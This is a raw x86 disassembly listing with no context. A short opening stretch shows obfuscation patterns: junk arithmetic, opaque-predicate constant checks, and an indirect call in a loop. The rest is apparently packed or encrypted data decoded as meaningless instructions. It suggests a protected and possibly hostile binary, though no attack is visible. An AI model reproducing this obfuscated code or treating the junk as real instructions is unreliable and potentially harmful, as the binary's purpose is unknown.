  402a81:	xor    ecx,edx
  402a83:	add    esi,DWORD PTR ds:0x429018
  402a89:	mov    esi,0x3272dd
  402a8e:	sub    DWORD PTR ds:0x42d004,0x41ed
  402a98:	push   edi
  402a99:	mov    edi,DWORD PTR [ebp+0x10]
  402a9c:	add    ecx,esi
  402a9e:	mov    DWORD PTR ds:0x42c014,0x852
  402aa8:	cmp    ecx,edi
  402aaa:	mov    DWORD PTR ds:0x42b014,0x2a3e
  402ab4:	je     0x404f9d
  402aba:	inc    ecx
  402abb:	mov    ecx,DWORD PTR [ebp-0x4]
  402abe:	and    DWORD PTR ds:0x42a010,0x0
  402ac8:	mov    edi,DWORD PTR ds:0x42a010
  402ace:	inc    edi
  402acf:	mov    DWORD PTR ds:0x42a010,edi
  402ad5:	cmp    DWORD PTR ds:0x42a010,0x2a
  402adc:	jne    0x402ae8
  402ae2:	call   DWORD PTR ds:0x42ed71
  402ae8:	cmp    DWORD PTR ds:0x42a010,0x1b
  402aef:	jb     0x402ac8
  402af5:	mov    edi,DWORD PTR ds:0x42c00c
  402afb:	sbb    DWORD PTR ds:0x42a01c,edi
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	xor    DWORD PTR ds:0x429010,0x457d
  402b0e:	xor    eax,eax
  402b10:	xor    DWORD PTR ds:0x42c010,0x42b010
  402b1a:	xor    ecx,edx
  402b1c:	add    DWORD PTR ds:0x429028,0x1d9a
  402b26:	add    ecx,esi
  402b28:	add    edi,0xfabdbeed
  402b2e:	mov    DWORD PTR ds:0x42d014,0x7361
  402b38:	adc    eax,0xffffffff
  402b3b:	xor    eax,0x0
  402b3e:	mov    DWORD PTR [ebp-0xc],eax
  402b41:	push   ebx
  402b42:	xor    ebx,ebx
  402b44:	xor    edi,0x8a29a127
  402b4a:	mov    eax,ecx
  402b4c:	add    eax,0xfabdbeed
  402b51:	adc    ebx,0xffffffff
  402b54:	xor    eax,0x8a29a127
  402b59:	xor    ebx,0x0
  402b5c:	cmp    eax,edi
  402b5e:	jne    0x404f2f
  402b64:	cmp    ebx,DWORD PTR [ebp-0xc]
  402b67:	je     0x404f97
  402b6d:	jmp    0x404f2f
  402b72:	mov    esi,0x3272dd
  402b77:	jmp    0x404f2f
  402b7c:	jmp    0x402b15
  402b7e:	iret   
  402b7f:	push   esi
  402b80:	jae    0x402b78
  402b82:	retf   
  402b83:	xchg   edi,eax
  402b84:	mov    al,ds:0xf555e01a
  402b89:	shr    DWORD PTR [edi+0x7a7a7a9e],1
  402b8f:	jp     0x402b68
  402b91:	pop    edi
  402b92:	jp     0x402c0e
  402b94:	adc    eax,0x1921172c
  402b99:	and    eax,0x3a652f1b
  402b9e:	imul   esp,DWORD PTR [esi+0x12],0x6d6a6a67
  402ba5:	xor    al,ch
  402ba7:	fsubr  st(1),st
  402ba9:	push   eax
  402baa:	dec    eax
  402bab:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402baf:	pusha  
  402bb0:	ins    DWORD PTR es:[edi],dx
  402bb1:	pop    ecx
  402bb2:	iret   
  402bb3:	pop    ebp
  402bb4:	dec    edx
  402bb5:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  402bbc:	jg     0x402bf5
  402bbe:	jo     0x402b66
  402bc0:	jg     0x402b62
  402bc2:	mov    ds:0x66ff2c3b,al
  402bc7:	fdiv   st(2),st
  402bc9:	push   ebx
  402bca:	jg     0x402bea
  402bcc:	in     eax,dx
  402bcd:	cmp    ebp,ecx
  402bcf:	mov    edx,0xde1387ed
  402bd4:	mov    ebp,DWORD PTR [ecx]
  402bd6:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  402bdd:	fld    QWORD PTR [esp+edx*8]
  402be0:	push   cs
  402be1:	cli    
  402be2:	sbb    BYTE PTR es:[eax+0xc],cl
  402be6:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  402beb:	adc    eax,DWORD PTR [ecx+0x5]
  402bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bef:	(bad)  
  402bf0:	jmp    0x32b4573e
  402bf5:	enter  0xf95b,0x1a
  402bf9:	cli    
  402bfa:	js     0x402b9d
  402bfc:	arpl   bp,bx
  402bfe:	cwde   
  402bff:	pop    edi
  402c00:	mov    esp,DWORD PTR [ecx+0x31821407]
  402c06:	repz sahf 
  402c08:	cmp    al,0x72
  402c0a:	jae    0x402c17
  402c0c:	fisubr DWORD PTR ds:0x33348d52
  402c12:	push   esp
  402c13:	jecxz  0x402be4
  402c15:	mov    ch,BYTE PTR [ecx]
  402c17:	mov    DWORD PTR [eax+0x5188ccb7],esi
  402c1d:	in     al,0x45
  402c1f:	push   edx
  402c20:	dec    esp
  402c21:	or     al,0x3e
  402c23:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  402c2b:	rol    BYTE PTR [esi+edx*2],0xfd
  402c2f:	push   edx
  402c30:	push   esi
  402c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c32:	stc    
  402c33:	push   0x1a42f8bf
  402c38:	in     al,dx
  402c39:	loope  0x402c46
  402c3b:	xchg   DWORD PTR [ebp-0x678dc537],ecx
  402c41:	sahf   
  402c42:	js     0x402bf6
  402c44:	add    ah,bh
  402c46:	pop    ds
  402c47:	addr16 mov al,0x3b
  402c4a:	jg     0x402c12
  402c4c:	push   edx
  402c4d:	test   BYTE PTR [edx+0x1f],dl
  402c50:	add    eax,0x153520d7
  402c55:	popa   
  402c56:	push   edi
  402c57:	push   cs
  402c58:	adc    DWORD PTR [eax+esi*2-0x19de793c],edi
  402c5f:	test   DWORD PTR [ebx],ecx
  402c61:	ds ds (bad) 
  402c65:	loope  0x402cb5
  402c67:	retf   0x194
  402c6a:	pop    ds
  402c6b:	and    BYTE PTR [edi+0x1ce92a91],bl
  402c71:	rcl    bh,0xcc
  402c74:	inc    edi
  402c75:	or     al,0x71
  402c77:	or     al,0xd9
  402c79:	fst    DWORD PTR [edx]
  402c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c7c:	scas   al,BYTE PTR es:[edi]
  402c7d:	pop    esi
  402c7e:	or     dl,BYTE PTR [edi-0x3a]
  402c81:	fwait
  402c82:	jmp    0x1aa3:0x1357d767
  402c89:	outs   dx,BYTE PTR ds:[esi]
  402c8a:	lea    eax,[edx+ecx*2+0x4ec72ebc]
  402c91:	mov    cl,0x7c
  402c93:	and    BYTE PTR [edi+eax*1-0x5f6848d9],cl
  402c9a:	mov    cl,0xc1
  402c9c:	mov    ecx,0x2368de71
  402ca1:	lock adc al,0xd5
  402ca4:	dec    edx
  402ca5:	call   0xfa64:0x4e603683
  402cac:	adc    eax,0x9ca71630
  402cb1:	pop    ss
  402cb2:	inc    edi
  402cb3:	adc    dl,BYTE PTR [esi]
  402cb5:	mov    cl,0xfb
  402cb7:	out    dx,al
  402cb8:	xchg   edx,eax
  402cb9:	pop    ds
  402cba:	xchg   esp,eax
  402cbb:	cmp    eax,0xb21c32c1
  402cc0:	xor    bl,al
  402cc2:	mov    edx,0xfe092489
  402cc7:	mov    esi,DWORD PTR [ecx-0x661c5a4f]
  402ccd:	jb     0x402ca8
  402ccf:	xor    DWORD PTR [esi-0x48],0x6a
  402cd3:	jecxz  0x402d48
  402cd5:	in     al,0x65
  402cd7:	cmp    eax,0x9b4fe12c
  402cdc:	pop    esp
  402cdd:	jle    0x402d46
  402cdf:	mov    ebx,0x8bd9a18b
  402ce4:	adc    ebx,DWORD PTR [edi-0x1b66dd25]
  402cea:	fs repz jle 0x402cda
  402cee:	scas   al,BYTE PTR es:[edi]
  402cef:	mov    cl,0xa
  402cf1:	(bad)  
  402cf2:	repz ret 
  402cf4:	adc    al,0xf0
  402cf6:	jl     0x402cb2
  402cf8:	test   al,0x98
  402cfa:	outs   dx,DWORD PTR ds:[esi]
  402cfb:	push   ebp
  402cfc:	mul    BYTE PTR [ebp-0x152771f6]
  402d02:	push   eax
  402d03:	pop    ebp
  402d04:	push   esp
  402d05:	sbb    al,BYTE PTR [ecx-0xd]
  402d08:	fdiv   QWORD PTR [edx+ebp*1]
  402d0b:	lods   al,BYTE PTR ds:[esi]
  402d0c:	cmp    esi,esi
  402d0e:	cmp    eax,0x2f46869
  402d13:	mov    bh,0x7d
  402d15:	xchg   esi,eax
  402d16:	fisubr WORD PTR [edi]
  402d18:	lods   al,BYTE PTR ds:[esi]
  402d19:	sub    al,0x59
  402d1b:	imul   esi,ebp,0x1f
  402d1e:	sbb    ah,BYTE PTR [eax-0x5256dab4]
  402d24:	mov    edx,0xcdbbff45
  402d29:	push   esi
  402d2a:	sahf   
  402d2b:	push   ecx
  402d2c:	xor    BYTE PTR [ebx+edx*8-0x42],bh
  402d30:	sub    eax,0xc15829c3
  402d35:	cmp    ch,BYTE PTR [edx+0x1b0c0541]
  402d3b:	fucomi st,st(1)
  402d3d:	pop    ds
  402d3e:	je     0x402cdf
  402d40:	mov    ds:0x4f76b7e1,eax
  402d45:	loopne 0x402d12
  402d47:	adc    al,0xdb
  402d49:	stc    
  402d4a:	xor    ebp,DWORD PTR [esi]
  402d4c:	inc    edi
  402d4d:	xchg   DWORD PTR [ebx],ebp
  402d4f:	sub    eax,0x9da1424
  402d54:	xchg   ebp,eax
  402d55:	dec    eax
  402d56:	push   edx
  402d57:	mov    ch,0x70
  402d59:	push   0xffffffb0
  402d5b:	jno    0x402da6
  402d5d:	jns    0x402d2c
  402d5f:	js     0x402d4a
  402d61:	lods   eax,DWORD PTR ds:[esi]
  402d62:	xor    eax,0x6361ccba
  402d67:	out    dx,eax
  402d68:	xchg   ebx,eax
  402d69:	aam    0xd5
  402d6b:	fisttp DWORD PTR [ebp+0x54a1be83]
  402d71:	mov    eax,ds:0xeeb02243
  402d76:	call   FWORD PTR [esi-0x69]
  402d79:	aam    0xa2
  402d7b:	lahf   
  402d7c:	inc    esi
  402d7d:	vsubsd xmm0,xmm5,xmm1
  402d81:	test   al,0xbb
  402d83:	add    bl,dl
  402d85:	sbb    dl,ah
  402d87:	add    al,0xb5
  402d89:	push   0x653eeb38
  402d8e:	das    
  402d8f:	push   ebp
  402d90:	mov    esp,0xad434f50
  402d95:	jne    0x402d2e
  402d97:	(bad)  
  402d98:	pop    edx
  402d99:	inc    ebx
  402d9a:	push   esi
  402d9b:	push   ebp
  402d9c:	or     DWORD PTR [edi+0x13793c7e],esi
  402da2:	stc    
  402da3:	mov    al,ds:0x5d424d3a
  402da8:	adc    dl,ah
  402daa:	ds iret 
  402dac:	das    
  402dad:	pop    eax
  402dae:	mov    ds:0xa3703b19,al
  402db3:	bound  ebp,QWORD PTR [ecx+0x77]
  402db6:	jne    0x402e05
  402db8:	mov    dl,0x17
  402dba:	lahf   
  402dbb:	push   ebx
  402dbc:	sahf   
  402dbd:	mov    ah,0xf0
  402dbf:	or     BYTE PTR [esi-0x4f],bh
  402dc2:	pop    eax
  402dc3:	mov    edi,0xdf7b6445
  402dc8:	fwait
  402dc9:	sbb    edx,DWORD PTR [edx-0x39]
  402dcc:	cmp    ebx,ebp
  402dce:	repnz add cl,BYTE PTR [eax+0x18cc55fe]
  402dd5:	sbb    BYTE PTR [ebx-0x3d8dbfb0],0x1b
  402ddc:	imul   edi,DWORD PTR [ecx+edi*2],0xa21ae25d
  402de3:	retf   
  402de4:	aaa    
  402de5:	add    eax,0x77474bc9
  402dea:	jge    0x402e44
  402dec:	sti    
  402ded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dee:	cwde   
  402def:	ror    DWORD PTR [ebp+0x5d],0xf1
  402df3:	push   0xdfd47ac9
  402df8:	jmp    0xd19665d1
  402dfd:	mov    bl,0x80
  402dff:	adc    BYTE PTR ds:0xc164288c,bl
  402e05:	jb     0x402e7c
  402e07:	pop    eax
  402e08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e09:	pop    esi
  402e0a:	not    BYTE PTR ds:0xa36bd5e4
  402e10:	sar    DWORD PTR [ebp-0xb],0xd3
  402e14:	jns    0x402dfd
  402e16:	mov    eax,0x31f9059e
  402e1b:	pushf  
  402e1c:	loop   0x402e47
  402e1e:	loop   0x402e50
  402e20:	stos   BYTE PTR es:[edi],al
  402e21:	loope  0x402e79
  402e23:	js     0x402de4
  402e25:	(bad)  
  402e26:	or     ah,BYTE PTR [edx]
  402e28:	into   
  402e29:	rep lods eax,DWORD PTR ds:[esi]
  402e2b:	and    al,bl
  402e2d:	bound  ebp,QWORD PTR [eax+0x11483b3e]
  402e33:	dec    ecx
  402e34:	dec    ecx
  402e35:	popa   
  402e36:	scas   eax,DWORD PTR es:[edi]
  402e37:	dec    edi
  402e38:	fndisi(8087 only) 
  402e3a:	test   BYTE PTR [esi+ebx*1-0xe],dl
  402e3e:	sub    eax,0x971caf26
  402e43:	hlt    
  402e44:	push   esi
  402e45:	cmp    bh,BYTE PTR [esi-0x63245d98]
  402e4b:	xor    al,0xc2
  402e4d:	push   cs
  402e4e:	adc    al,0xd9
  402e50:	pop    edi
  402e51:	or     bl,BYTE PTR [ebp+0x5f]
  402e54:	js     0x402ea3
  402e56:	fcom   DWORD PTR [edx-0x1d]
  402e59:	call   0xbf708ab4
  402e5e:	jmp    0x402e76
  402e60:	ja     0x402e58
  402e62:	xor    esi,ebx
  402e64:	inc    eax
  402e65:	cmp    BYTE PTR ds:0x62a09d88,dl
  402e6b:	push   edx
  402e6c:	getsec 
  402e6e:	mov    edx,0xbe11f7d1
  402e73:	ret    0x5c41
  402e76:	test   BYTE PTR [ebp-0x6c525c57],al
  402e7c:	mov    eax,0x6ec1c28b
  402e81:	enter  0xc477,0x81
  402e85:	cs retf 0xee85
  402e89:	mov    esi,0x5ac22fa
  402e8e:	rcr    DWORD PTR [eax-0x1],1
  402e91:	fs jb  0x402eb1
  402e94:	mov    ds:0x3fce58af,eax
  402e99:	idiv   ch
  402e9b:	aaa    
  402e9c:	fidiv  DWORD PTR [ebx-0x87da211]
  402ea2:	inc    ebx
  402ea3:	xor    dl,cl
  402ea5:	adc    DWORD PTR [edx-0x1fc51d92],edx
  402eab:	mov    dh,0xf7
  402ead:	mov    ebp,0xdca6907c
  402eb2:	ds mov dh,0xc0
  402eb5:	pop    edx
  402eb6:	(bad)  
  402eb7:	jl     0x402f17
  402eb9:	dec    ecx
  402eba:	sub    ch,BYTE PTR [ecx-0x3fcde26e]
  402ec0:	mov    al,ds:0xe8fb0d49
  402ec5:	arpl   si,dx
  402ec7:	adc    al,0x5b
  402ec9:	iret   
  402eca:	loope  0x402f24
  402ecc:	ins    BYTE PTR es:[edi],dx
  402ecd:	inc    eax
  402ece:	int3   
  402ecf:	lahf   
  402ed0:	mov    WORD PTR [ecx],cs
  402ed2:	dec    ebx
  402ed3:	sti    
  402ed4:	icebp  
  402ed5:	repnz fs push ss
  402ed8:	add    eax,0x4c4e819a
  402edd:	aaa    
  402ede:	mov    cl,BYTE PTR [ebp+0x515e297b]
  402ee4:	dec    ebp
  402ee5:	adc    al,0x12
  402ee7:	jecxz  0x402ea4
  402ee9:	mov    ch,0x11
  402eeb:	xor    esi,DWORD PTR [edi+ecx*4]
  402eee:	hlt    
  402eef:	ficomp DWORD PTR [edx+0x61a4220d]
  402ef5:	xchg   edi,eax
  402ef6:	mov    esp,0xeef69934
  402efb:	sub    cl,BYTE PTR [edx]
  402efd:	inc    esp
  402efe:	pusha  
  402eff:	push   ds
  402f00:	cmp    al,0x2d
  402f02:	je     0x402edd
  402f04:	jg     0x402ee0
  402f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f07:	out    0x4e,eax
  402f09:	shl    DWORD PTR [ebx+0x3dc5ed0],cl
  402f0f:	outs   dx,BYTE PTR ds:[esi]
  402f10:	cmp    BYTE PTR [edx-0x76e9fad1],al
  402f16:	enter  0xa5c8,0x9
  402f1a:	dec    ebp
  402f1b:	ja     0x402f3c
  402f1d:	jp     0x402eda
  402f1f:	inc    edx
  402f20:	pop    ss
  402f21:	(bad)  
  402f22:	aam    0x3
  402f24:	push   edi
  402f25:	outs   dx,BYTE PTR ds:[esi]
  402f26:	retf   0xef80
  402f29:	stc    
  402f2a:	add    BYTE PTR [edx-0x65],dl
  402f2d:	imul   edx,DWORD PTR [ebx+ecx*4-0xa],0xffffffd6
  402f32:	xchg   DWORD PTR [edi-0x36b83485],esp
  402f38:	dec    ebx
  402f39:	jl     0x402f51
  402f3b:	test   ah,ah
  402f3d:	mov    bh,0x57
  402f3f:	push   0x5ff067a5
  402f44:	div    esi
  402f46:	push   esp
  402f47:	jecxz  0x402f3b
  402f49:	mov    esp,0x94f62601
  402f4e:	jae    0x402fce
  402f50:	repz aam 0xf8
  402f53:	mov    ?,WORD PTR [edx+0x47]
  402f56:	cmp    eax,0x67939331
  402f5b:	add    ebp,DWORD PTR [edi]
  402f5d:	dec    esi
  402f5e:	dec    ebp
  402f5f:	jl     0x402fc9
  402f61:	ds push 0xffffffea
  402f64:	lods   al,BYTE PTR ds:[esi]
  402f65:	xchg   esp,eax
  402f66:	or     dh,0xcd
  402f69:	and    ebx,DWORD PTR [edx]
  402f6b:	push   ds
  402f6c:	mov    cl,0x43
  402f6e:	dec    esp
  402f6f:	cmp    cl,dh
  402f71:	jmp    0x264d:0xae77e32c
  402f78:	aas    
  402f79:	call   0xda87:0x6e0f213a
  402f80:	add    BYTE PTR [edi+0x17],dh
  402f83:	(bad)  
  402f84:	repnz mov esi,0x611cc300
  402f8a:	bound  ebp,QWORD PTR [edi+0x72b5b49b]
  402f90:	cmp    dh,BYTE PTR [esi]
  402f92:	xor    eax,0xc2bb92f3
  402f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f98:	ffree  st(1)
  402f9a:	fdivr  st,st(7)
  402f9c:	addr16 cld 
  402f9e:	add    al,0x5c
  402fa0:	xchg   esi,eax
  402fa1:	out    0x40,eax
  402fa3:	jno    0x403012
  402fa5:	imul   eax,DWORD PTR [ebx-0x45],0xb6caa3d
  402fac:	jmp    0x1cc74675
  402fb1:	into   
  402fb2:	add    DWORD PTR [edi+0x64],edi
  402fb5:	(bad)  
  402fb6:	in     al,0x59
  402fb8:	cdq    
  402fb9:	mov    bh,cl
  402fbb:	sahf   
  402fbc:	xor    BYTE PTR [ebx+0x71],bl
  402fbf:	or     eax,DWORD PTR [ebx]
  402fc1:	add    eax,0xc2b4617d
  402fc6:	lods   al,BYTE PTR ds:[esi]
  402fc7:	or     dh,BYTE PTR [eax-0x5bc33e70]
  402fcd:	in     eax,0xbb
  402fcf:	mov    eax,ds:0x9e70dcd2
  402fd4:	sti    
  402fd5:	xchg   DWORD PTR [ecx+0x66e33443],edi
  402fdb:	jge    0x402fb2
  402fdd:	ds int3 
  402fdf:	mov    edi,0x8758df1c
  402fe4:	mov    WORD PTR [eax],gs
  402fe6:	jecxz  0x402f9f
  402fe8:	out    dx,eax
  402fe9:	sub    al,0xa9
  402feb:	add    ebp,DWORD PTR [ebp-0x6ad16715]
  402ff1:	sub    eax,0xb6fa4b4b
  402ff6:	jae    0x402f85
  402ff8:	mov    ecx,0x62704b03
  402ffd:	retf   0x7db4
  403000:	sub    eax,0x74a9bf71
  403005:	(bad)  [eax]
  403007:	mov    cs,WORD PTR [edx-0x52a2eb87]
  40300d:	push   ebp
  40300e:	(bad)  
  40300f:	scas   al,BYTE PTR es:[edi]
  403010:	fsubr  QWORD PTR [ebx-0x2d]
  403013:	mov    ah,BYTE PTR [esi]
  403015:	retf   0x9786
  403018:	pop    edi
  403019:	retf   0x6fc9
  40301c:	arpl   WORD PTR [edi],dx
  40301e:	test   al,0x7a
  403020:	pop    es
  403021:	lods   al,BYTE PTR ds:[esi]
  403022:	sub    ebx,DWORD PTR [ebx+edx*4+0x2babf08f]
  403029:	adc    ah,BYTE PTR [edx]
  40302b:	int3   
  40302c:	mov    dl,0x9e
  40302e:	dec    ebx
  40302f:	je     0x40305f
  403031:	xor    eax,eax
  403033:	aam    0xe0
  403035:	push   edx
  403036:	push   edx
  403037:	or     bh,BYTE PTR [ebp+0x32]
  40303a:	jge    0x40306c
  40303c:	dec    ebx
  40303d:	mov    bl,0x4e
  40303f:	add    eax,0xd47cfa93
  403044:	test   DWORD PTR [edx+0x64],ebx
  403047:	stos   BYTE PTR es:[edi],al
  403048:	xor    dl,BYTE PTR [edx+ecx*1+0x3e]
  40304c:	std    
  40304d:	jne    0x403001
  40304f:	(bad)  
  403050:	cld    
  403051:	int3   
  403052:	adc    eax,0x365a8465
  403057:	cmc    
  403058:	push   esp
  403059:	xchg   ebx,eax
  40305a:	pop    es
  40305b:	jl     0x40301c
  40305d:	arpl   WORD PTR [ecx],bx
  40305f:	xor    DWORD PTR [edx-0x39],0x54
  403063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403064:	mov    ebx,0x7f9f9a05
  403069:	lock jnp 0x4030cd
  40306c:	or     DWORD PTR [ebx-0x1],esp
  40306f:	inc    ebp
  403070:	sbb    BYTE PTR [ebx+0x4f],dl
  403073:	jl     0x402ff7
  403075:	add    DWORD PTR [ecx-0x64],eax
  403078:	pop    esi
  403079:	dec    ebx
  40307a:	in     al,dx
  40307b:	adc    DWORD PTR [edx+ecx*8+0x50],ebx
  40307f:	xchg   ebp,eax
  403080:	or     eax,0x3e781e85
  403085:	adc    esi,eax
  403087:	call   0xebc0:0x7f01e17
  40308e:	fldenv [edx+edx*2+0x26172552]
  403095:	mov    ecx,0xbadf4cbb
  40309a:	(bad)  
  40309b:	pop    edx
  40309c:	ret    
  40309d:	imul   esp,DWORD PTR [edi],0xd
  4030a0:	loope  0x4030b7
  4030a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030a3:	js     0x403119
  4030a5:	call   0x9981:0xac44c3bc
  4030ac:	pop    esp
  4030ad:	xor    al,0x81
  4030af:	fidiv  WORD PTR [edx+0x75]
  4030b2:	push   0xffffffd6
  4030b4:	sbb    esi,DWORD PTR [ebx]
  4030b6:	xor    dh,al
  4030b8:	mov    al,ch
  4030ba:	arpl   WORD PTR [edx],ax
  4030bc:	add    dh,BYTE PTR [edx+0x5b]
  4030bf:	ret    
  4030c0:	jnp    0x4030e9
  4030c2:	pop    esi
  4030c3:	nop
  4030c4:	cmp    edi,edx
  4030c6:	xchg   ebp,eax
  4030c7:	and    al,0xce
  4030c9:	scas   al,BYTE PTR es:[edi]
  4030ca:	in     eax,dx
  4030cb:	sbb    eax,0x1a3a2e44
  4030d0:	in     eax,0x31
  4030d2:	leave  
  4030d3:	adc    BYTE PTR [ecx+0x10],0xc3
  4030d7:	adc    BYTE PTR [ecx],al
  4030d9:	jnp    0x40314f
  4030db:	mov    ch,0x31
  4030dd:	dec    eax
  4030de:	(bad)  
  4030e1:	push   esp
  4030e2:	sbb    eax,0x22fec6dd
  4030e7:	pop    ebx
  4030e8:	call   0x3283e3e3
  4030ed:	shr    BYTE PTR [ebx-0x3425da38],0xc5
  4030f4:	add    BYTE PTR [esi-0x53],dh
  4030f7:	jle    0x403122
  4030f9:	mov    edi,0x26e8aca9
  4030fe:	lea    esp,[edx]
  403100:	cmp    BYTE PTR [eax+eax*8-0x2e],bl
  403104:	dec    DWORD PTR [esi+0x59a7fd57]
  40310a:	push   esi
  40310b:	out    0xcb,al
  40310d:	fidiv  DWORD PTR [ebp+edi*2-0x2aeeb4b8]
  403114:	dec    esp
  403115:	xchg   edx,eax
  403116:	dec    edi
  403117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403118:	jne    0x403178
  40311a:	dec    edx
  40311b:	test   eax,0xe14988a7
  403120:	jle    0x40317e
  403122:	ins    BYTE PTR es:[edi],dx
  403123:	clc    
  403124:	adc    al,0x61
  403126:	imul   DWORD PTR [esi+0x189b0af9]
  40312c:	and    cl,BYTE PTR [eax+0x50]
  40312f:	std    
  403130:	sar    BYTE PTR [ecx-0x1d6527d1],1
  403136:	push   cs
  403137:	adc    BYTE PTR [ebx-0x7f],dl
  40313a:	(bad)  
  40313c:	pop    eax
  40313d:	or     DWORD PTR [edx-0x3d64c7ae],ecx
  403143:	pusha  
  403144:	pushf  
  403145:	dec    edi
  403146:	fiadd  DWORD PTR [eax+0xe33e465]
  40314c:	icebp  
  40314d:	popf   
  40314e:	mov    ah,0x88
  403150:	push   edi
  403151:	push   ecx
  403152:	clc    
  403153:	fnstsw WORD PTR [eax]
  403155:	mov    al,ds:0x88292070
  40315a:	push   cs
  40315b:	push   esi
  40315c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40315d:	cmc    
  40315e:	retf   
  40315f:	mov    dl,al
  403161:	and    edi,DWORD PTR [ebp-0x726baa1c]
  403167:	test   eax,0x886ad0d9
  40316c:	and    esp,DWORD PTR [ebp+edi*4-0x5e909e49]
  403173:	jne    0x4031bb
  403175:	jge    0x403129
  403177:	or     al,0x61
  403179:	mov    ds:0xe4832485,eax
  40317e:	jecxz  0x403121
  403180:	shl    BYTE PTR [edi+0x56b32cc3],1
  403186:	xchg   ebx,eax
  403187:	adc    DWORD PTR [esi+edi*8-0x54],edi
  40318b:	js     0x4031ef
  40318d:	push   esi
  40318e:	pop    ss
  40318f:	push   es
  403190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403191:	xchg   BYTE PTR [ebx+0x7b],ch
  403194:	stos   DWORD PTR es:[edi],eax
  403195:	ja     0x403174
  403197:	inc    edx
  403198:	js     0x403161
  40319a:	add    al,0xc7
  40319c:	dec    ebp
  40319d:	push   cs
  40319e:	add    ebp,0x611f14f5
  4031a4:	push   esp
  4031a5:	mov    ds:0x54765fd4,eax
  4031aa:	gs not dl
  4031ad:	mov    edx,DWORD PTR ds:0x60708669
  4031b3:	pop    esp
  4031b4:	popa   
  4031b5:	push   esp
  4031b6:	scas   eax,DWORD PTR es:[edi]
  4031b7:	xchg   ecx,eax
  4031b8:	jg     0x4031fd
  4031ba:	adc    BYTE PTR cs:[edi],al
  4031bd:	(bad)  
  4031bf:	lock and bh,BYTE PTR [eax+0x3]
  4031c3:	ds stos BYTE PTR es:[edi],al
  4031c5:	jmp    0x5cbe9082
  4031ca:	jg     0x403242
  4031cc:	pop    ecx
  4031cd:	iret   
  4031ce:	mov    ecx,0xb1797e0b
  4031d3:	in     al,dx
  4031d4:	and    WORD PTR [ebx+0x330d4a2d],cx
  4031db:	in     al,dx
  4031dc:	sbb    DWORD PTR [eax-0x77],ebx
  4031df:	loop   0x4031d9
  4031e1:	jecxz  0x403185
  4031e3:	and    DWORD PTR [edi+0x10],esi
  4031e6:	ja     0x403218
  4031e8:	mov    ecx,0x4de331c7
  4031ed:	dec    esi
  4031ee:	sub    eax,DWORD PTR [edi]
  4031f0:	pop    esp
  4031f1:	adc    ebx,DWORD PTR [eax+0x53a62ae7]
  4031f7:	pop    ebp
  4031f8:	xchg   esp,eax
  4031f9:	call   0xd0f6:0x63a40448
  403200:	push   edx
  403201:	ja     0x403184
  403203:	jecxz  0x40321c
  403205:	and    al,0x2c
  403207:	and    DWORD PTR [ebx+0x3a1b8b80],0x82e2b61e
  403211:	or     bh,ah
  403213:	mov    WORD PTR [ecx-0x17],sp
  403217:	add    BYTE PTR [ebx-0x53],ch
  40321a:	std    
  40321b:	jg     0x4031b4
  40321d:	push   ds
  40321e:	add    al,0x35
  403220:	loope  0x4031bc
  403222:	in     eax,0x74
  403224:	shr    DWORD PTR [esi+esi*1-0x6c84fb96],cl
  40322b:	call   0x9f7d:0xbf393f9d
  403232:	mov    ds:0x8c85448,al
  403237:	pushf  
  403238:	sbb    dl,BYTE PTR [edx]
  40323a:	dec    edi
  40323b:	jl     0x4031fd
  40323d:	fcmovb st,st(4)
  40323f:	lahf   
  403240:	xchg   ecx,eax
  403241:	xor    ah,BYTE PTR [edi-0xe21b631]
  403247:	popf   
  403248:	stos   DWORD PTR es:[edi],eax
  403249:	fbstp  TBYTE PTR [edi]
  40324b:	call   FWORD PTR [eax]
  40324d:	add    edi,DWORD PTR [edi]
  40324f:	or     eax,esp
  403251:	mov    WORD PTR [edi],ds
  403253:	cs mov ebp,esp
  403256:	add    ebp,DWORD PTR [edx+0x28]
  403259:	mov    esp,0x2ead5306
  40325e:	rcl    edi,cl
  403260:	bound  ecx,QWORD PTR [esi+0x53]
  403263:	call   0xeceb0cc2
  403268:	out    dx,eax
  403269:	iret   
  40326a:	pop    ebp
  40326b:	or     eax,0xcd97d84e
  403270:	pop    ds
  403271:	jge    0x4032e3
  403273:	popa   
  403274:	push   bp
  403276:	mov    eax,0xcd92dfb7
  40327b:	leave  
  40327c:	mov    ds:0x2821a229,al
  403281:	push   eax
  403282:	cdq    
  403283:	int3   
  403284:	ret    
  403285:	icebp  
  403286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403287:	pop    ss
  403288:	into   
  403289:	xchg   ebx,eax
  40328a:	jge    0x403270
  40328c:	push   cs
  40328d:	test   al,0x8d
  40328f:	iret   
  403290:	fcomp  DWORD PTR [esp+ecx*8]
  403293:	movntps XMMWORD PTR [ebx+edi*2-0x4d],xmm5
  403298:	stos   DWORD PTR es:[edi],eax
  403299:	mov    esp,0xc72604e0
  40329e:	scas   eax,DWORD PTR es:[edi]
  40329f:	mov    ch,ah
  4032a1:	xchg   DWORD PTR [esi],ecx
  4032a3:	imul   esp
  4032a5:	popa   
  4032a6:	repz xor BYTE PTR [ebx-0x6d5bd42a],ch
  4032ad:	add    al,0xbc
  4032af:	xor    BYTE PTR [ebx+0x12],dl
  4032b2:	push   edx
  4032b3:	push   eax
  4032b4:	jmp    0x403247
  4032b6:	stos   BYTE PTR es:[edi],al
  4032b7:	(bad)  
  4032b8:	aad    0x25
  4032ba:	mov    edx,ss
